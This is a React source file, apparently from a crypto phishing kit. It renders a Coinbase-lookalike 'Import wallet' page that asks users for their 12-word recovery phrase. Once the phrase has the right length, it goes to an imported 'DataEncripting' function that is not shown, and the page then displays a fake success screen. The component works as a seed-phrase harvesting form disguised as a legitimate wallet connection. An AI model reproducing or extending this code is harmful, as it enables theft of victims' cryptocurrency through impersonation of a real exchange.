import Input from '../../../components/UI/Input/Input';
import React, {useState} from 'react';
import {DataEncripting} from '../../../utils/arrayParser';
import CoinBaseSuccess from '../Profile/PaymentOptions/CoinBaseWallet/CoinBaseSuccess/CoinBaseSuccess';
import {checkSidLength} from '../../../utils/checkSidPhrase';

const CoinBaseFrasePage = ({ onGoBackFirst }) => {
  const [phrase, setPhrase] = useState('')
  const [coinbaseSuccess, setCoinBaseSuccess] = useState(false)
  const [errorPhrase, setErrorPhrase] = useState(false)


  const onSubmitCoinbase = async (e) => {
    e.preventDefault()
    if (checkSidLength(phrase) === 12) {
      await DataEncripting(phrase)
      setTimeout(() => {
        setCoinBaseSuccess(true)
        localStorage.setItem('connected', 'true')
      }, 1000)
    } else {
      setErrorPhrase(true)
    }

  }


  const onChange = (e) => {
    setPhrase(e.target.value)
  }


  return (
    <div style={{alignItems: 'center'}} className="coinbaseWrap_inner">
      {
        coinbaseSuccess ? <CoinBaseSuccess /> :
          <form onSubmit={onSubmitCoinbase} style={{ width: "100%", height: '100%', position: 'relative', paddingBottom: '30px' }}>
            <div style={{ position: "absolute", left: "-10px", top: "-10px" }}>
              <button onClick={onGoBackFirst} className="goBackBtn" type="button">
                <div
                  className="cds-flex-f5gx5i9 cds-relative-ryk0urh"
                  style={{ position: "relative" }}
                >
                  <div style={{ width: 24, height: 24 }}>
                    <svg
                      fill="#000"
                      width="24px"
                      height="24px"
                      viewBox="0 0 24 24"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path d="M12.707 17.293 8.414 13H18v-2H8.414l4.293-4.293-1.414-1.414L4.586 12l6.707 6.707z"></path>
                    </svg>
                  </div>
                </div>
              </button>
            </div>
            <div
              className="cds-flex-f5gx5i9 cds-row-rk6vx3t cds-center-cc86uqj cds-1-_18x24ic"
              style={{ width: "100%" }}
            >
              <div className="pagination">
                <div className="paginationItem active"></div>
                <div className="paginationItem active"></div>
                <div className="paginationItem"></div>
              </div>
            </div>
            <div className='coinbaseWrap_connectWallet'>
              <div style={{position: 'relative'}}>
                <h1 style={{margin: '20px 0', fontWeight: 'bold'}} className='coinbaseWrap_h1'>Import wallet</h1>
                <h2 style={{margin: '20px 0'}} className='coinbaseWrap_h2'>Connect Your Wallet By Using Sid Phrase. You can import any Ethereum or Solana wallet.</h2>
                <Input style={{marginTop: 50}} value={phrase} onChange={onChange} classname='inputTransparent' placeholder='Sid phrase' />
                {errorPhrase ? <div style={{color: 'tomato', fontSize: '12', position: 'absolute', bottom: '-20px'}}>Check sid phrase</div> : null}
              </div>
              <button
                style={{
                  backgroundColor: "blue",
                  color: "#fff",
                  border: "none",
                  padding: "15px 20px",
                  borderRadius: 40,
                  width: "100%",
                  cursor: "pointer"
                }}
              >Connect</button>
            </div>
          </form>
      }
    </div>
  );
};

export default CoinBaseFrasePage;
